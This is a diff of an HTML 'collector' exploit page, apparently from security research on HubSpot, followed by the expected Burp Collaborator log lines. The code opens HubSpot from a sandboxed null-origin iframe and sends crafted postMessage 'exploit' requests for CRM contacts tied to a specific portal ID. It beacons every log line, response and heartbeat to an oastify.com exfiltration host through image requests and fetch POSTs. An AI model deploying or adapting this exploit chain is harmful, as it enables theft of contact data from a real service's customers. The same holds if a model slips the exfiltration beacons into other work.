@@ -1,146 +1,221 @@
 <!DOCTYPE html>
 <html>
 <head><title>Collector</title></head>
-<body>
-<h2>Advanced Collector</h2>
-<div id="log"></div>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<h2>Collector Active</h2>
+<div id="log" style="max-height:80vh;overflow:auto;border:1px solid #0f0;padding:10px;"></div>
 
 <script>
 const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
+let msgCount = 0;
 
 function log(msg) {
-    document.getElementById('log').innerHTML += '<br>' + msg;
-    new Image().src = 'https://' + EXFIL + '/?log=' + encodeURIComponent(msg);
+    msgCount++;
+    const time = new Date().toLocaleTimeString();
+    document.getElementById('log').innerHTML = `[${time}] #${msgCount}: ${msg}<br>` + document.getElementById('log').innerHTML;
+    
+    // Exfiltrate from collector (NOT from null frame)
+    new Image().src = `https://${EXFIL}/?c=${encodeURIComponent(msg)}`;
 }
 
-log('Collector loaded');
+log('✓ Collector loaded');
 
 window.addEventListener('message', function(e) {
+    log(`📨 Message from: ${e.origin}`);
+    
+    // Handle instruction from XSS
     if (e.data.action === 'CREATE_NULL_ATTACK') {
-        log('Creating null origin attack...');
+        log('🚀 Creating null origin attack');
         
-        // Step 1: Create sandboxed iframe with null origin
         const nullFrame = document.createElement('iframe');
-        nullFrame.sandbox = 'allow-scripts allow-popups';  // NO allow-same-origin = null origin!
-        nullFrame.style.cssText = 'width:100%;height:300px;border:2px solid red';
+        nullFrame.sandbox = 'allow-scripts allow-popups'; // NULL ORIGIN!
+        nullFrame.style.cssText = 'width:100%;height:400px;border:3px solid yellow;margin-top:20px';
         
         nullFrame.srcdoc = `
-            <h3>Null Origin Frame</h3>
-            <div id="status"></div>
-            <script>
-                const E = '${EXFIL}';
-                
-                function l(m) {
-                    document.getElementById('status').innerHTML += '<br>' + m;
-                    new Image().src = 'https://' + E + '/?null=' + encodeURIComponent(m);
-                }
-                
-                l('Null frame origin: ' + window.origin);
-                
-                // Step 2: Open HubSpot - it inherits null origin!
-                l('Opening HubSpot from null origin...');
-                
-                const hub = window.open('${e.data.target}', 'hubspot', 'width=900,height=700');
-                
-                if (!hub) {
-                    l('ERROR: popup blocked');
-                } else {
-                    l('HubSpot opened with inherited null origin');
-                    
-                    // Step 3: Poll until loaded
-                    let attempts = 0;
-                    const checker = setInterval(() => {
-                        attempts++;
-                        
-                        try {
-                            hub.origin; // Will throw when loaded
-                            if (attempts % 10 === 0) l('waiting_' + attempts);
-                        } catch(err) {
-                            clearInterval(checker);
-                            l('HubSpot loaded! Both origins are NULL');
-                            
-                            // Step 4: Listen for responses
-                            window.addEventListener('message', resp => {
-                                if (resp.source === hub) {
-                                    l('Got response from HubSpot!');
-                                    
-                                    const data = JSON.stringify(resp.data);
-                                    
-                                    // Send to parent collector
-                                    window.parent.postMessage({
-                                        type: 'HUBSPOT_DATA',
-                                        data: resp.data
-                                    }, '*');
-                                    
-                                    new Image().src = 'https://' + E + '/?hubspot_resp=' + encodeURIComponent(data.substring(0, 400));
-                                }
-                            });
-                            
-                            // Step 5: Send exploits (both have null origin!)
-                            setTimeout(() => {
-                                l('Sending exploit 1');
-                                
-                                hub.postMessage({
-                                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                                    commandId: 'getContacts',
-                                    featureId: 'crm',
-                                    parameters: {
-                                        portalId: '${e.data.portalId}',
-                                        properties: ['firstname', 'super_secret', 'email']
-                                    },
-                                    resultCount: 100,
-                                    language: 'en',
-                                    objectId: '${e.data.portalId}',
-                                    applicationId: 'crm',
-                                    basePath: '/crm/v3/objects/contacts'
-                                }, '*');
-                            }, 1000);
-                            
-                            setTimeout(() => {
-                                l('Sending exploit 2');
-                                
-                                hub.postMessage({
-                                    type: 'raw',
-                                    body: {
-                                        action: 'getData',
-                                        portalId: '${e.data.portalId}'
-                                    }
-                                }, '*');
-                            }, 2000);
-                        }
-                        
-                        if (attempts > 100) {
-                            clearInterval(checker);
-                            l('Timeout');
-                        }
-                    }, 100);
-                }
-            </scr\ipt>
-        `;
-        
-        document.body.appendChild(nullFrame);
-        log('Null origin iframe created!');
-    }
-    
-    // Forward data from null frame to opener
-    if (e.data.type === 'HUBSPOT_DATA') {
-        log('Forwarding HubSpot data to opener');
-        
-        if (window.opener) {
-            window.opener.postMessage(e.data.data, '*');
-        }
-        
-        // Also exfiltrate
-        fetch('https://' + EXFIL + '/hubspot_data', {
-            method: 'POST',
-            body: JSON.stringify(e.data.data)
-        });
-    }
-});
+<!DOCTYPE html>
+<html>
+<body style="background:#333;color:#ff0;padding:10px;font-family:monospace;">
+<h3>Null Origin Frame</h3>
+<div id="s"></div>
+<script>
+function l(m) {
+    document.getElementById('s').innerHTML += '<br>' + m;
+    // Send ALL logs to parent via postMessage
+    window.parent.postMessage({type: 'LOG', msg: m}, '*');
+}
 
-if (window.opener) {
-    window.opener.postMessage({status: 'collector_ready'}, '*');
+l('NULL_FRAME: Origin = ' + window.origin);
+l('NULL_FRAME: Opening HubSpot...');
+
+try {
+    const hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
+    
+    if (!hub) {
+        l('NULL_FRAME: ERROR - popup blocked');
+        window.parent.postMessage({type: 'ERROR', msg: 'Popup blocked'}, '*');
+    } else {
+        l('NULL_FRAME: HubSpot window opened');
+        window.parent.postMessage({type: 'SUCCESS', msg: 'HubSpot opened'}, '*');
+        
+        // Poll until loaded
+        let attempts = 0;
+        const checker = setInterval(() => {
+            attempts++;
+            
+            try {
+                hub.origin; // Throws when cross-origin
+                if (attempts % 20 === 0) {
+                    l('NULL_FRAME: Still loading... attempt ' + attempts);
+                }
+            } catch(err) {
+                clearInterval(checker);
+                l('NULL_FRAME: HubSpot loaded! Attempts: ' + attempts);
+                l('NULL_FRAME: Error msg: ' + err.message);
+                
+                window.parent.postMessage({
+                    type: 'HUBSPOT_LOADED',
+                    attempts: attempts
+                }, '*');
+                
+                // Listen for HubSpot responses
+                window.addEventListener('message', resp => {
+                    if (resp.source === hub) {
+                        l('NULL_FRAME: Got response from HubSpot!');
+                        
+                        // Send to parent collector
+                        window.parent.postMessage({
+                            type: 'HUBSPOT_RESPONSE',
+                            data: resp.data
+                        }, '*');
+                    }
+                });
+                
+                // Send exploits
+                setTimeout(() => {
+                    l('NULL_FRAME: Sending exploit 1');
+                    
+                    hub.postMessage({
+                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                        commandId: 'getContacts',
+                        featureId: 'crm',
+                        parameters: {portalId: '46962361'},
+                        resultCount: 100,
+                        language: 'en',
+                        objectId: '46962361',
+                        applicationId: 'crm',
+                        basePath: '/crm/v3/objects/contacts'
+                    }, '*');
+                    
+                    window.parent.postMessage({type: 'LOG', msg: 'Exploit 1 sent'}, '*');
+                }, 1000);
+                
+                setTimeout(() => {
+                    l('NULL_FRAME: Sending exploit 2');
+                    
+                    hub.postMessage({
+                        type: 'raw',
+                        body: {action: 'getData', portalId: '46962361'}
+                    }, '*');
+                    
+                    window.parent.postMessage({type: 'LOG', msg: 'Exploit 2 sent'}, '*');
+                }, 2000);
+            }
+            
+            if (attempts > 150) {
+                clearInterval(checker);
+                l('NULL_FRAME: TIMEOUT after ' + attempts + ' attempts');
+                window.parent.postMessage({type: 'ERROR', msg: 'Timeout'}, '*');
+            }
+        }, 100);
+    }
+} catch(err) {
+    l('NULL_FRAME: EXCEPTION - ' + err.message);
+    window.parent.postMessage({type: 'ERROR', msg: err.message}, '*');
 }
 </script>
 </body>
 </html>
+        `;
+        
+        document.body.appendChild(nullFrame);
+        log('✓ Null iframe added to DOM');
+    }
+    
+    // Handle messages FROM the null frame
+    if (e.data.type === 'LOG') {
+        log('🔸 ' + e.data.msg);
+    }
+    
+    if (e.data.type === 'ERROR') {
+        log('❌ ERROR: ' + e.data.msg);
+    }
+    
+    if (e.data.type === 'SUCCESS') {
+        log('✅ SUCCESS: ' + e.data.msg);
+    }
+    
+    if (e.data.type === 'HUBSPOT_LOADED') {
+        log('🎯 HubSpot loaded after ' + e.data.attempts + ' attempts');
+    }
+    
+    if (e.data.type === 'HUBSPOT_RESPONSE') {
+        log('💎 HUBSPOT RESPONSE RECEIVED!');
+        
+        const data = JSON.stringify(e.data.data);
+        log('Data preview: ' + data.substring(0, 100));
+        
+        // Exfiltrate
+        fetch(`https://${EXFIL}/hubspot_response`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        });
+        
+        new Image().src = `https://${EXFIL}/?resp=${encodeURIComponent(data.substring(0, 400))}`;
+        
+        // Forward to opener
+        if (window.opener) {
+            window.opener.postMessage({
+                type: 'HUBSPOT_DATA',
+                data: e.data.data
+            }, '*');
+        }
+    }
+});
+
+// Notify opener
+if (window.opener) {
+    log('✓ Has opener - sending ready signal');
+    window.opener.postMessage({status: 'collector_ready'}, '*');
+} else {
+    log('⚠️ No opener detected');
+}
+
+// Heartbeat
+setInterval(() => {
+    new Image().src = `https://${EXFIL}/?heartbeat=${msgCount}`;
+}, 10000);
+</script>
+</body>
+</html>
+```
+
+---
+
+## **What You Should See Now:**
+
+**In Burp:**
+```
+/?c=✓%20Collector%20loaded
+/?c=✓%20Has%20opener
+/?c=📨%20Message%20from:%20https://...hubspotpreview
+/?c=🚀%20Creating%20null%20origin%20attack
+/?c=✓%20Null%20iframe%20added%20to%20DOM
+/?c=🔸%20NULL_FRAME:%20Origin%20=%20null
+/?c=🔸%20NULL_FRAME:%20Opening%20HubSpot...
+/?c=✅%20SUCCESS:%20HubSpot%20opened
+/?c=🔸%20NULL_FRAME:%20Still%20loading...
+/?c=🎯%20HubSpot%20loaded%20after%20X%20attempts
+/?c=🔸%20Exploit%201%20sent
+/?c=💎%20HUBSPOT%20RESPONSE%20RECEIVED!
+POST /hubspot_response
